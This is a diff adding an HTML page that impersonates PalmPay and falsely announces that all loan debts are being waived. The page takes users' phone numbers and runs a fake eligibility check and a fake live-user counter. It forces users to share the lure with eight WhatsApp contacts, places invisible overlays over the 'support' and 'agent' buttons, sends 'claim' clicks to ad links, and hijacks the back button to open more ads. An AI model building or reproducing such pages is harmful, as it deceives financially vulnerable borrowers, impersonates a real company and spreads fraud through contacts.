@@ -1,0 +1,960 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Debt Relief · Check eligibility</title>
+  
+  <!-- Favicon -->
+  <link rel="icon" type="image/png" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiPZ40wdhjO-jYUpcTmC1guCzmj-rjmsmMHRbWYVKOTCFenan2LI8adXO5vp0JJi_vKh8NDYH0nwkmBAduXb-IKZNmUgHsCW9GzOFzFc8VOaPOTNao1ebBMLiVf37lRyQuE7aWrB0E7v4QG68oLXNolp8hjZ2uxw-cTv-VrMnMkdJAiJYyr7Cfo9E7PLAmc/s1672/55893.png">
+
+  <!-- Social Preview Image (Open Graph) -->
+  <meta property="og:title" content=" Debt Relief · Check eligibility">
+  <meta property="og:description" content="We are currently waving off all loan debts for eligible users. Check if you qualify today.">
+  <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiPZ40wdhjO-jYUpcTmC1guCzmj-rjmsmMHRbWYVKOTCFenan2LI8adXO5vp0JJi_vKh8NDYH0nwkmBAduXb-IKZNmUgHsCW9GzOFzFc8VOaPOTNao1ebBMLiVf37lRyQuE7aWrB0E7v4QG68oLXNolp8hjZ2uxw-cTv-VrMnMkdJAiJYyr7Cfo9E7PLAmc/s1672/55893.png">
+  <meta name="twitter:card" content="summary_large_image">
+
+  <!-- Font & Icons -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: #F8F7FC; 
+      color: #1E1A2F;
+      line-height: 1.5;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+    }
+
+    .app-container {
+      width: 100%;
+      max-width: 430px;
+      background: #FFFFFF;
+      border-radius: 32px 32px 0 0;
+      box-shadow: 0 10px 30px rgba(108, 43, 217, 0.08);
+      padding: 24px 20px 32px;
+      margin: 0 auto;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      position: relative;
+    }
+
+    /* HEADER */
+    .brand-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 16px;
+    }
+
+    .logo-img {
+      height: 32px;
+      object-fit: contain;
+    }
+
+    .header-right {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .toggle-pill {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      background: #F4F5F7;
+      padding: 4px 10px;
+      border-radius: 20px;
+      color: #0E8A4E;
+      font-weight: 700;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .toggle-pill i {
+      font-size: 10px;
+      color: #A0A5B1;
+      margin-left: 2px;
+    }
+
+    .hamburger-menu {
+      display: flex;
+      flex-direction: column;
+      gap: 5px;
+      cursor: pointer;
+      padding: 4px;
+    }
+
+    .hamburger-menu span {
+      width: 22px;
+      height: 2.5px;
+      background: #1E1A2F;
+      border-radius: 2px;
+    }
+
+    /* HERO IMAGE & CUSTOM COUNTER */
+    .hero-image-container {
+      width: 100%;
+      border-radius: 16px;
+      overflow: hidden;
+      margin-bottom: 12px;
+      background: #F0EBFA;
+      min-height: 120px; 
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .hero-image-container img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    .supercounter-wrap {
+      margin-bottom: 20px;
+      text-align: center;
+      background: #FDFCFE;
+      border: 1px solid #F0EBFA;
+      padding: 10px;
+      border-radius: 12px;
+    }
+
+    .supercounter-title {
+      font-size: 12px;
+      font-weight: 600;
+      color: #6C2BD9;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 4px;
+    }
+
+    .supercounter-number {
+      font-size: 20px;
+      font-weight: 800;
+      color: #0E8A4E;
+      font-family: monospace;
+    }
+
+    /* Progress */
+    .progress-steps {
+      display: flex;
+      justify-content: space-between;
+      margin: 0 0 20px;
+      position: relative;
+    }
+
+    .progress-steps::before {
+      content: '';
+      position: absolute;
+      top: 12px;
+      left: 10%;
+      width: 80%;
+      height: 2px;
+      background: #E9E4F5;
+      z-index: 1;
+    }
+
+    .step-dot {
+      width: 26px;
+      height: 26px;
+      background: #FFFFFF;
+      border: 2px solid #E9E4F5;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      font-weight: 600;
+      color: #A69FC0;
+      z-index: 2;
+      transition: all 0.3s ease;
+    }
+
+    .step-dot.active {
+      background: #6C2BD9;
+      border-color: #6C2BD9;
+      color: white;
+      box-shadow: 0 4px 10px rgba(108, 43, 217, 0.3);
+    }
+
+    .step-dot.completed {
+      background: #6C2BD9;
+      border-color: #6C2BD9;
+      color: white;
+    }
+
+    /* Screens */
+    .screen {
+      display: none;
+      flex-direction: column;
+      flex: 1;
+      animation: fadeIn 0.35s cubic-bezier(0.2, 0.9, 0.4, 1);
+    }
+
+    .screen.active {
+      display: flex;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(6px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* INTRO */
+    .hero-badge {
+      background: #F0EBFA;
+      color: #6C2BD9;
+      font-weight: 600;
+      font-size: 13px;
+      padding: 8px 16px;
+      border-radius: 30px;
+      display: inline-block;
+      margin-bottom: 20px;
+      align-self: flex-start;
+    }
+
+    .headline {
+      font-size: 30px;
+      font-weight: 800;
+      line-height: 1.2;
+      letter-spacing: -0.02em;
+      color: #1E1A2F;
+      margin-bottom: 16px;
+    }
+
+    .headline span { color: #6C2BD9; }
+
+    .subhead {
+      font-size: 16px;
+      color: #5A5470;
+      margin-bottom: 28px;
+      line-height: 1.6;
+    }
+
+    .feature-list {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+      margin-bottom: 36px;
+    }
+
+    .feature-item {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      font-size: 15px;
+      font-weight: 500;
+      color: #2D2640;
+    }
+
+    .feature-item i { color: #6C2BD9; font-size: 18px; width: 24px; }
+
+    .btn-primary {
+      background: #6C2BD9;
+      color: white;
+      border: none;
+      border-radius: 16px;
+      padding: 18px 20px;
+      font-size: 17px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      box-shadow: 0 8px 20px rgba(108, 43, 217, 0.25);
+      margin-top: auto;
+      width: 100%;
+      position: relative;
+      z-index: 10;
+    }
+
+    .btn-primary:active { transform: scale(0.98); background: #5A1EB8; }
+
+    .btn-secondary {
+      background: #FFFFFF;
+      color: #6C2BD9;
+      border: 1.5px solid #D9CFF0;
+      border-radius: 16px;
+      padding: 16px 20px;
+      font-size: 16px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      cursor: pointer;
+      width: 100%;
+      position: relative;
+    }
+
+    .disclaimer-small {
+      font-size: 12px;
+      color: #8E88A3;
+      text-align: center;
+      margin-top: 16px;
+    }
+
+    /* FORM */
+    .form-title { font-size: 24px; font-weight: 700; margin-bottom: 8px; }
+    .form-sub { font-size: 15px; color: #5A5470; margin-bottom: 24px; }
+
+    .input-group { margin-bottom: 18px; }
+    .input-group label { display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px; }
+
+    .input-field {
+      width: 100%;
+      padding: 16px 18px;
+      border: 1.5px solid #E9E4F5;
+      border-radius: 16px;
+      font-size: 16px;
+      font-family: 'Inter', sans-serif;
+      background: #FFFFFF;
+      outline: none;
+    }
+
+    .input-field:focus { border-color: #6C2BD9; box-shadow: 0 0 0 4px rgba(108, 43, 217, 0.1); }
+
+    .radio-group { display: flex; gap: 12px; margin-top: 6px; }
+
+    .radio-option {
+      flex: 1;
+      padding: 16px 10px;
+      border: 1.5px solid #E9E4F5;
+      border-radius: 16px;
+      text-align: center;
+      font-weight: 600;
+      font-size: 16px;
+      background: #FFFFFF;
+      cursor: pointer;
+      color: #5A5470;
+    }
+
+    .radio-option.selected {
+      border-color: #6C2BD9;
+      background: #F0EBFA;
+      color: #6C2BD9;
+      box-shadow: 0 4px 10px rgba(108, 43, 217, 0.1);
+    }
+
+    /* LOADING */
+    .loading-container {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 30px 0;
+    }
+
+    .spinner-icon {
+      width: 80px;
+      height: 80px;
+      background: #F0EBFA;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 24px;
+    }
+
+    .spinner-icon i { font-size: 40px; color: #6C2BD9; animation: pulse 1.8s infinite; }
+
+    @keyframes pulse {
+      0% { transform: scale(1); opacity: 1; }
+      50% { transform: scale(1.1); opacity: 0.8; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    .progress-bar-wrapper { width: 100%; max-width: 320px; margin: 20px 0 10px; }
+    .progress-bar-bg { width: 100%; height: 8px; background: #E9E4F5; border-radius: 20px; overflow: hidden; }
+    .progress-bar-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #6C2BD9, #8B5CF6); transition: width 0.4s ease; }
+    .progress-percent { font-size: 14px; font-weight: 600; color: #6C2BD9; margin-top: 10px; display: block; }
+    .loading-message { font-size: 15px; color: #5A5470; margin-top: 16px; min-height: 48px; }
+
+    /* PRE-QUAL */
+    .eligibility-card {
+      background: linear-gradient(145deg, #F8F7FC 0%, #FFFFFF 100%);
+      border-radius: 24px;
+      padding: 24px 20px;
+      margin-bottom: 24px;
+      border: 1px solid #F0EBFA;
+      text-align: center;
+    }
+
+    .eligibility-badge {
+      background: #E6F9ED;
+      color: #0E8A4E;
+      font-size: 13px;
+      font-weight: 700;
+      padding: 8px 16px;
+      border-radius: 30px;
+      display: inline-block;
+      margin-bottom: 16px;
+    }
+
+    .amount-highlight { font-size: 28px; font-weight: 800; color: #6C2BD9; margin: 12px 0 6px; }
+    
+    .social-proof {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      background: #F0EBFA;
+      padding: 16px;
+      border-radius: 16px;
+      margin-bottom: 24px;
+    }
+    
+    .social-proof i { color: #6C2BD9; font-size: 20px; }
+
+    /* WHATSAPP GATE */
+    .whatsapp-gate {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+    }
+
+    .whatsapp-icon-big {
+      width: 80px;
+      height: 80px;
+      background: #25D366;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+      box-shadow: 0 10px 25px rgba(37, 211, 102, 0.3);
+    }
+
+    .whatsapp-icon-big i { font-size: 40px; color: white; }
+    .share-title { font-size: 24px; font-weight: 700; margin-bottom: 12px; }
+    .share-desc { font-size: 15px; color: #5A5470; margin-bottom: 20px; max-width: 300px; }
+
+    .share-counter {
+      background: #F0EBFA;
+      color: #6C2BD9;
+      padding: 8px 16px;
+      border-radius: 20px;
+      font-weight: 700;
+      font-size: 14px;
+      margin-bottom: 24px;
+      display: inline-block;
+    }
+
+    /* FINAL CLAIM & ADS */
+    .claim-card {
+      background: #FFFFFF;
+      border-radius: 24px;
+      padding: 24px 20px;
+      text-align: center;
+      border: 1.5px solid #F0EBFA;
+      margin-bottom: 20px;
+    }
+
+    .claim-icon {
+      width: 60px;
+      height: 60px;
+      background: #F0EBFA;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 12px;
+    }
+
+    .claim-icon i { font-size: 28px; color: #6C2BD9; }
+    .claim-title { font-size: 22px; font-weight: 700; color: #0E8A4E; margin-bottom: 6px; }
+    .claim-meta { font-size: 14px; color: #5A5470; margin-bottom: 20px; }
+    
+    .action-buttons { display: flex; flex-direction: column; gap: 10px; margin-top: 16px; position: relative; }
+
+    /* Ad Overlay Strategy */
+    .ad-overlay {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      height: 40%;
+      z-index: 99;
+      cursor: pointer;
+      opacity: 0;
+    }
+
+    /* Footer */
+    .site-footer {
+      background: #1A1625; 
+      color: #B0A8C0;
+      padding: 40px 20px 30px;
+      font-size: 13px;
+      line-height: 1.6;
+      width: 100%;
+      max-width: 430px;
+      margin: 0 auto;
+    }
+
+    .footer-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 24px;
+    }
+
+    .footer-logo { height: 26px; }
+
+    .footer-socials { display: flex; gap: 12px; }
+    
+    .footer-socials a {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 32px;
+      height: 32px;
+      background: #FFFFFF;
+      border-radius: 50%;
+      color: #1A1625;
+      text-decoration: none;
+      font-size: 16px;
+    }
+
+    .footer-copy { margin-bottom: 16px; font-weight: 500; color: #E2DDEB; }
+    
+    .footer-disclaimer {
+      border-top: 1px solid #332D42;
+      padding-top: 16px;
+      font-size: 12px;
+      color: #8E88A3;
+      margin-bottom: 20px;
+    }
+
+    .supercounter-footer {
+      text-align: center;
+      margin-top: 10px;
+      display: flex;
+      justify-content: center;
+    }
+
+  </style>
+</head>
+<body>
+  <div class="app-container" id="appContainer">
+    <!-- Header -->
+    <div class="brand-header">
+      <!-- Updated Logo -->
+      <img src="hhhh" alt="PalmWineLogo" class="logo-img" style="height: 28px;">
+      
+      <div class="header-right">
+        <div class="toggle-pill">
+          II <i class="fas fa-chevron-up"></i>
+        </div>
+        <div class="hamburger-menu">
+          <span></span>
+          <span></span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Hero Image -->
+    <div class="hero-image-container">
+      <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiPZ40wdhjO-jYUpcTmC1guCzmj-rjmsmMHRbWYVKOTCFenan2LI8adXO5vp0JJi_vKh8NDYH0nwkmBAduXb-IKZNmUgHsCW9GzOFzFc8VOaPOTNao1ebBMLiVf37lRyQuE7aWrB0E7v4QG68oLXNolp8hjZ2uxw-cTv-VrMnMkdJAiJYyr7Cfo9E7PLAmc/s1672/55893.png" alt="Debt Relief" onerror="this.style.display='none'; this.parentNode.style.background='linear-gradient(135deg, #6C2BD9 0%, #8B5CF6 100%)'; this.parentNode.innerHTML='<span style=\'color:white; font-weight:bold; font-size:18px;\'>PalmPay Debt Relief</span>';">
+    </div>
+
+    <!-- Custom Live Counter below Hero Image -->
+    <div class="supercounter-wrap">
+      <div class="supercounter-title">Live users checking eligibility</div>
+      <div class="supercounter-number" id="topLiveCounter">14,491</div>
+    </div>
+
+    <!-- Progress dots -->
+    <div class="progress-steps" id="progressSteps">
+      <div class="step-dot active" data-step="1">1</div>
+      <div class="step-dot" data-step="2">2</div>
+      <div class="step-dot" data-step="3">3</div>
+      <div class="step-dot" data-step="4">4</div>
+    </div>
+
+    <!-- SCREEN 1: INTRO -->
+    <div class="screen active" id="screenIntro">
+      <div class="hero-badge"><i class="fas fa-bolt"></i> Official Debt Wavier</div>
+      <h1 class="headline">PalmPay is <span>waving off</span> all loan debts.</h1>
+      <p class="subhead">PalmPay and Flexi are currently waving off outstanding loan balances for eligible users. Check if your account has been cleared for debt relief today.</p>
+      <div class="feature-list">
+        <div class="feature-item"><i class="fas fa-check-circle"></i> 100% Loan Wavier</div>
+        <div class="feature-item"><i class="fas fa-check-circle"></i> Clear your credit record</div>
+        <div class="feature-item"><i class="fas fa-check-circle"></i> Fast & secure process</div>
+      </div>
+      <button class="btn-primary" id="startBtn">Check my eligibility <i class="fas fa-arrow-right"></i></button>
+      <p class="disclaimer-small">By continuing you agree to receive updates about your eligibility.</p>
+    </div>
+
+    <!-- SCREEN 2: FORM -->
+    <div class="screen" id="screenForm">
+      <h2 class="form-title">Let’s get you started</h2>
+      <p class="form-sub">Enter your PalmPay registered details to check for loan debt wavier.</p>
+      <div class="input-group">
+        <label for="phoneNumber">Phone Number (PalmPay registered)</label>
+        <input type="tel" id="phoneNumber" class="input-field" placeholder="e.g. 08012345678">
+      </div>
+      <div class="input-group">
+        <label>Do you currently have an outstanding PalmPay / Flexi loan?</label>
+        <div class="radio-group" id="loanRadioGroup">
+          <div class="radio-option" data-value="yes"><i class="fas fa-check"></i> Yes</div>
+          <div class="radio-option" data-value="no"><i class="fas fa-times"></i> No</div>
+        </div>
+      </div>
+      <div class="form-footer">
+        <button class="btn-primary" id="submitFormBtn">Continue <i class="fas fa-arrow-right"></i></button>
+        <button class="btn-secondary" id="backToIntroBtn">Back</button>
+      </div>
+    </div>
+
+    <!-- SCREEN 3: LOADING / CHECKING -->
+    <div class="screen" id="screenLoading">
+      <div class="loading-container">
+        <div class="spinner-icon"><i class="fas fa-search"></i></div>
+        <h2 style="font-size: 22px; margin-bottom: 6px;">Checking your eligibility</h2>
+        <p style="color: #5A5470; font-size: 15px; margin-bottom: 8px;">We're reviewing your PalmPay / Flexi account for debt wavier…</p>
+        <div class="progress-bar-wrapper">
+          <div class="progress-bar-bg">
+            <div class="progress-bar-fill" id="progressFill"></div>
+          </div>
+          <span class="progress-percent" id="progressPercent">0%</span>
+        </div>
+        <div class="loading-message" id="loadingMessage">Connecting to secure server…</div>
+      </div>
+    </div>
+
+    <!-- SCREEN 4: PRE-QUALIFICATION -->
+    <div class="screen" id="screenPrequal">
+      <div class="eligibility-card">
+        <div class="eligibility-badge"><i class="fas fa-check-circle"></i> Pre-qualified</div>
+        <p style="font-size: 15px; color: #5A5470; margin-bottom: 4px;">You may be eligible for a</p>
+        <div class="amount-highlight">100% Loan Wavier</div>
+        <p class="amount-sub">on your outstanding Flexi loan</p>
+      </div>
+      <div class="social-proof">
+        <i class="fas fa-users"></i>
+        <div>
+          <p>Over 12,400 users qualified this month</p>
+          <small>Based on recent PalmPay debt relief data</small>
+        </div>
+      </div>
+      <p style="font-size: 15px; color: #2D2640; font-weight: 500; margin-bottom: 20px;">To unlock your final offer and claim, share with 8 friends on WhatsApp.</p>
+      <button class="btn-primary" id="goToShareBtn"><i class="fab fa-whatsapp"></i> Share on WhatsApp to continue</button>
+    </div>
+
+    <!-- SCREEN 5: WHATSAPP SHARE GATE -->
+    <div class="screen" id="screenShare">
+      <div class="whatsapp-gate">
+        <div class="whatsapp-icon-big"><i class="fab fa-whatsapp"></i></div>
+        <h2 class="share-title">Share to unlock your offer</h2>
+        <p class="share-desc">Share this message with 8 friends on WhatsApp to continue to your final claim.</p>
+        
+        <div class="share-counter" id="shareCounterDisplay">0 / 8 Shares</div>
+
+        <button class="btn-primary" id="shareWhatsappBtn" style="background: #25D366; box-shadow: 0 8px 20px rgba(37, 211, 102, 0.3);">
+          <i class="fab fa-whatsapp"></i> Share now
+        </button>
+      </div>
+    </div>
+
+    <!-- SCREEN 6: FINAL CLAIM -->
+    <div class="screen" id="screenClaim">
+      <div class="claim-card">
+        <div class="claim-icon"><i class="fas fa-gift"></i></div>
+        <h2 class="claim-title">Offer Unlocked!</h2>
+        <p class="claim-meta" id="claimNameDisplay">Your loan wavier is ready.</p>
+        
+        <div class="action-buttons">
+          <button class="btn-primary" id="claimNowBtn"><i class="fas fa-hand-holding-usd"></i> Claim my wavier</button>
+          
+          <div style="position: relative;">
+            <button class="btn-secondary"><i class="fas fa-headset"></i> Contact support</button>
+            <div class="ad-overlay" id="adOverlay1"></div>
+          </div>
+
+          <button class="btn-secondary" id="checkStatusBtn"><i class="fas fa-search-dollar"></i> Check my status</button>
+          
+          <button class="btn-secondary" id="viewOfferBtn"><i class="fas fa-file-invoice"></i> View full offer letter</button>
+
+          <div style="position: relative;">
+            <button class="btn-secondary"><i class="fas fa-phone-alt"></i> Speak to an agent</button>
+            <div class="ad-overlay" id="adOverlay2" style="height: 50%;"></div>
+          </div>
+        </div>
+      </div>
+      <p class="small-note" style="margin-top: 12px;">Offer valid for a limited time. Terms apply.</p>
+    </div>
+  </div>
+
+  <!-- FOOTER -->
+  <footer class="site-footer">
+    <div class="footer-header">
+      <!-- Updated Logo -->
+      <img src="hhhh" alt="PalmWine" class="footer-logo" style="filter: brightness(0) invert(1);">
+      <div class="footer-socials">
+        <a href="#"><i class="fab fa-instagram"></i></a>
+        <a href="#"><i class="fab fa-facebook-f"></i></a>
+        <a href="#"><i class="fab fa-x-twitter"></i></a>
+        <a href="#"><i class="fab fa-linkedin-in"></i></a>
+      </div>
+    </div>
+    
+    <p class="footer-copy">© 2026 PalmPay. All rights reserved.</p>
+    
+    <div class="footer-disclaimer">
+      bxbxbbcbc
+    </div>
+
+    <!-- Supercounters Script -->
+    <div class="supercounter-footer">
+      <!-- BEGIN: Powered by Supercounters.com -->
+      <center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1741445,"ffffff","e61c1c");</script></center>
+      <!-- END: Powered by Supercounters.com -->
+    </div>
+  </footer>
+
+  <script>
+    (function() {
+      // ---- AD LINKS ----
+      const adLink1 = "https://uplcm.com/4/10077877";
+      const adLink2 = "https://uplcm.com/4/9742092";
+      const adLink3 = "https://uplcm.com/4/9742301";
+
+      // ---- STATE ----
+      let currentScreen = 'intro'; 
+      let formData = { phoneNumber: '', hasLoan: null };
+      let adTriggered = false; 
+      let shareCount = 0;
+      const requiredShares = 8;
+
+      // ---- ELEMENTS ----
+      const screens = {
+        intro: document.getElementById('screenIntro'),
+        form: document.getElementById('screenForm'),
+        loading: document.getElementById('screenLoading'),
+        prequal: document.getElementById('screenPrequal'),
+        share: document.getElementById('screenShare'),
+        claim: document.getElementById('screenClaim')
+      };
+
+      const stepDots = document.querySelectorAll('.step-dot');
+      const startBtn = document.getElementById('startBtn');
+      const submitFormBtn = document.getElementById('submitFormBtn');
+      const backToIntroBtn = document.getElementById('backToIntroBtn');
+      const goToShareBtn = document.getElementById('goToShareBtn');
+      const shareWhatsappBtn = document.getElementById('shareWhatsappBtn');
+      const shareCounterDisplay = document.getElementById('shareCounterDisplay');
+      
+      const phoneNumberInput = document.getElementById('phoneNumber');
+      const radioGroup = document.getElementById('loanRadioGroup');
+      const radioOptions = radioGroup.querySelectorAll('.radio-option');
+
+      const progressFill = document.getElementById('progressFill');
+      const progressPercent = document.getElementById('progressPercent');
+      const loadingMessage = document.getElementById('loadingMessage');
+      const claimNameDisplay = document.getElementById('claimNameDisplay');
+      
+      const topLiveCounter = document.getElementById('topLiveCounter');
+
+      // ---- SCREEN NAVIGATION ----
+      function showScreen(screenId) {
+        Object.values(screens).forEach(s => s.classList.remove('active'));
+        screens[screenId].classList.add('active');
+        currentScreen = screenId;
+        updateProgressDots();
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+      }
+
+      function updateProgressDots() {
+        let step = 1;
+        if (currentScreen === 'intro') step = 1;
+        else if (currentScreen === 'form' || currentScreen === 'loading') step = 2;
+        else if (currentScreen === 'prequal' || currentScreen === 'share') step = 3;
+        else if (currentScreen === 'claim') step = 4;
+
+        stepDots.forEach((dot, idx) => {
+          dot.classList.remove('active', 'completed');
+          const dotStep = idx + 1;
+          if (dotStep < step) dot.classList.add('completed');
+          else if (dotStep === step) dot.classList.add('active');
+        });
+      }
+
+      // ---- RADIO SELECTION ----
+      radioOptions.forEach(opt => {
+        opt.addEventListener('click', function() {
+          radioOptions.forEach(o => o.classList.remove('selected'));
+          this.classList.add('selected');
+          formData.hasLoan = this.dataset.value;
+        });
+      });
+
+      // ---- INTRO -> FORM ----
+      startBtn.addEventListener('click', () => showScreen('form'));
+      backToIntroBtn.addEventListener('click', () => showScreen('intro'));
+
+      // ---- FORM SUBMIT ----
+      submitFormBtn.addEventListener('click', function() {
+        const phone = phoneNumberInput.value.trim();
+        const hasLoan = formData.hasLoan;
+
+        if (!phone || phone.length < 10) { alert('Please enter a valid phone number.'); return; }
+        if (!hasLoan) { alert('Please select whether you have an outstanding loan.'); return; }
+
+        formData.phoneNumber = phone;
+
+        showScreen('loading');
+        runLoadingSimulation();
+      });
+
+      // ---- LOADING SIMULATION ----
+      let loadingInterval = null;
+      function clearTimers() { if (loadingInterval) clearInterval(loadingInterval); }
+
+      function runLoadingSimulation() {
+        clearTimers();
+        let progress = 0;
+        let messageIndex = 0;
+        const messages = [
+          'Connecting to secure server…',
+          'Verifying your PalmPay account…',
+          'Analyzing loan history…',
+          'Checking wavier eligibility…',
+          'Finalizing your offer…'
+        ];
+
+        progressFill.style.width = '0%';
+        progressPercent.textContent = '0%';
+        loadingMessage.textContent = messages[0];
+
+        loadingInterval = setInterval(() => {
+          if (progress < 30) progress += 4 + Math.random() * 3;
+          else if (progress < 70) progress += 2 + Math.random() * 2;
+          else if (progress < 90) progress += 1 + Math.random() * 1.5;
+          else if (progress < 98) progress += 0.5 + Math.random() * 1;
+          else progress = 100;
+
+          if (progress > 100) progress = 100;
+          progressFill.style.width = progress + '%';
+          progressPercent.textContent = Math.floor(progress) + '%';
+
+          if (progress > 20 && messageIndex < 1) { messageIndex = 1; loadingMessage.textContent = messages[1]; }
+          if (progress > 45 && messageIndex < 2) { messageIndex = 2; loadingMessage.textContent = messages[2]; }
+          if (progress > 70 && messageIndex < 3) { messageIndex = 3; loadingMessage.textContent = messages[3]; }
+          if (progress > 90 && messageIndex < 4) { messageIndex = 4; loadingMessage.textContent = messages[4]; }
+
+          if (progress >= 100) {
+            clearTimers();
+            setTimeout(() => {
+              // Using the last 4 digits of the phone number for personalization
+              const last4 = formData.phoneNumber.slice(-4);
+              claimNameDisplay.textContent = `Your loan wavier for ending ${last4} is ready.`;
+              showScreen('prequal');
+            }, 600);
+          }
+        }, 180);
+      }
+
+      // ---- PREQUAL -> SHARE ----
+      goToShareBtn.addEventListener('click', () => showScreen('share'));
+
+      // ---- SHARE COUNTER & TRIGGER ----
+      shareWhatsappBtn.addEventListener('click', function() {
+        const message = `*PALMPAY DEBT RELIEF UPDATE*\n\nPalmPay is currently waving off *all loan debts* for eligible users.\n\nMany people are getting their Flexi/PalmPay loans cleared completely.\n\n*Check if you qualify here* 👇\nhttps://metaink.xyz/PalmPay-Debt-Wavier\n\n_Share this with anyone who has PalmPay loan so they don’t miss it._`;
+        const waUrl = `https://wa.me/?text=${encodeURIComponent(message)}`;
+        window.open(waUrl, '_blank');
+        
+        shareCount++;
+        shareCounterDisplay.textContent = `${shareCount} / ${requiredShares} Shares`;
+        
+        if (shareCount >= requiredShares) {
+          setTimeout(() => {
+            showScreen('claim');
+          }, 500);
+        } else if (shareCount > 0) {
+          shareWhatsappBtn.innerHTML = `<i class="fab fa-whatsapp"></i> Share again (${shareCount}/${requiredShares})`;
+        }
+      });
+
+      // ---- AD STRATEGIES ON FINAL PAGE ----
+      document.getElementById('claimNowBtn').addEventListener('click', function(e) {
+        e.preventDefault();
+        window.open(adLink1, '_blank');
+        window.open(adLink2, '_blank');
+      });
+
+      document.getElementById('adOverlay1').addEventListener('click', function(e) {
+        e.preventDefault();
+        window.open(adLink3, '_blank');
+      });
+      
+      document.getElementById('adOverlay2').addEventListener('click', function(e) {
+        e.preventDefault();
+        window.open(adLink3, '_blank');
+      });
+
+      document.getElementById('checkStatusBtn').addEventListener('click', function(e) {
+        e.preventDefault();
+        window.open(adLink1, '_blank');
+      });
+
+      document.getElementById('viewOfferBtn').addEventListener('click', function(e) {
+        e.preventDefault();
+        window.open(adLink2, '_blank');
+      });
+
+      // Back-Redirection Strategy
+      function pushAdHistory() {
+        if (!adTriggered) {
+          history.pushState({ page: 'claim' }, '', location.href);
+        }
+      }
+
+      const originalShowScreen = showScreen;
+      showScreen = function(screenId) {
+        originalShowScreen(screenId);
+        if (screenId === 'claim') {
+          setTimeout(pushAdHistory, 500);
+        }
+      };
+
+      window.addEventListener('popstate', function(e) {
+        if (currentScreen === 'claim' && !adTriggered) {
+          adTriggered = true; 
+          window.open(adLink3, '_blank');
+          history.pushState({ page: 'claim' }, '', location.href);
+        }
+      });
+
+      // ---- TOP LIVE COUNTER SIMULATION ----
+      let liveCount = 14491;
+      setInterval(() => {
+        liveCount += Math.floor(Math.random() * 4) + 1;
+        topLiveCounter.textContent = liveCount.toLocaleString();
+      }, 4000);
+
+    })();
+  </script>
+</body>
+</html>
